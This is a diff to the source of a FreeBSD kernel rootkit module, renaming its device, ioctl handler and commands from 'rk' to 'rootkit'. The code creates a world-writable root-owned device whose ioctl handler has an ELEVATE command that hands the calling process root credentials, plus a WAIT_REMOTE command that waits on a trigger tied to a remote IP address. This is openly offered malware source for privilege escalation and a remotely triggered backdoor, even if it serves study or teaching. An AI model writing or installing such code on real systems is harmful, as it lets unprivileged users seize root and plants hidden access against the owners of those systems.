@@ -12,7 +12,7 @@
 
 #include "interface.h"
 
-static struct cdev *rk_dev;
+static struct cdev *rootkit_dev;
 
 /* Global synchronization primitives defined in module for remote trigger */
 extern struct cv remote_cv;
@@ -21,7 +21,7 @@ extern struct in_addr trigger_ip;
 extern int trigger_flag;
 
 static int
-rk_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *td) {
+rootkit_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *td) {
 
     (void)dev;
     (void)data;
@@ -29,7 +29,7 @@ rk_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *t
     int error = 0;
  
     switch (cmd) {
-    case RK_ELEVATE: {
+    case rootkit_ELEVATE: {
         struct proc *p = td->td_proc;
         struct ucred *user_cred;
         struct ucred *root_cred = crget();
@@ -59,7 +59,7 @@ rk_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *t
         break;
     }
 
-    case RK_WAIT_REMOTE: {
+    case rootkit_WAIT_REMOTE: {
         mtx_lock(&remote_mtx);
         while (!trigger_flag) {
             error = cv_wait_sig(&remote_cv, &remote_mtx);
@@ -81,28 +81,28 @@ rk_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int flags, struct thread *t
     return (error);
 }
 
-static struct cdevsw rk_cdevsw = {
+static struct cdevsw rootkit_cdevsw = {
     .d_version = D_VERSION,
-    .d_name    = "rk",
-    .d_ioctl   = rk_ioctl
+    .d_name    = "rootkit",
+    .d_ioctl   = rootkit_ioctl
 };
 
-int make_rk_dev(void) {
+int make_rootkit_dev(void) {
     return make_dev_p(
         MAKEDEV_CHECKNAME | MAKEDEV_WAITOK,
-        &rk_dev,
-        &rk_cdevsw,
+        &rootkit_dev,
+        &rootkit_cdevsw,
         NULL,
         UID_ROOT,
         GID_WHEEL,
         0666,
-        "rk"
+        "rootkit"
     );
 }
 
-void destroy_rk_dev(void) {
-    if (rk_dev != NULL) {
-        destroy_dev(rk_dev);
-        rk_dev = NULL;
+void destroy_rootkit_dev(void) {
+    if (rootkit_dev != NULL) {
+        destroy_dev(rootkit_dev);
+        rootkit_dev = NULL;
     }
 }
